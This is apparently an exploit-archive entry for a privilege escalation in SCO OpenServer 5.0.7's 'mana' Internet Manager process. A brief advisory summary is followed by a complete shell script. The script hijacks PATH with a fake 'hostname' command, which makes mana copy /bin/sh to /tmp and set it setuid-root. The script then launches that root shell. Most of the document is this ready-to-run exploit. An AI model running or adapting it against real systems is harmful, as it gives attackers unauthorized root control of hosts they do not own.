source: http://www.securityfocus.com/bid/8618/info

It has been reported that SCO OpenServer Inertnet Manager 'mana' process is prone to a privilege escalation issue allow local users to execute arbitrary code with elevated privileges. mana normally requires authentication, but this may be circumvented via exploitation of BID 8616. An attacker could exploit this issue by setting certain environment variables used by the program to cause an attacker-specified file to be executed with elevated privileges.

Successful exploitation of this issue would allow a remote attacker to execute arbitrary code as root.

#!/bin/sh
#
# OpenServer 5.0.7 - Local mana root shell
#
#

REMOTE_ADDR=127.0.0.1
PATH_INFO=/pass-err.mana
PATH=./:$PATH

export REMOTE_ADDR
export PATH_INFO
export PATH

echo "cp /bin/sh /tmp;chmod 4777 /tmp/sh;" > hostname

chmod 755 hostname

/usr/internet/admin/mana/mana > /dev/null

/tmp/sh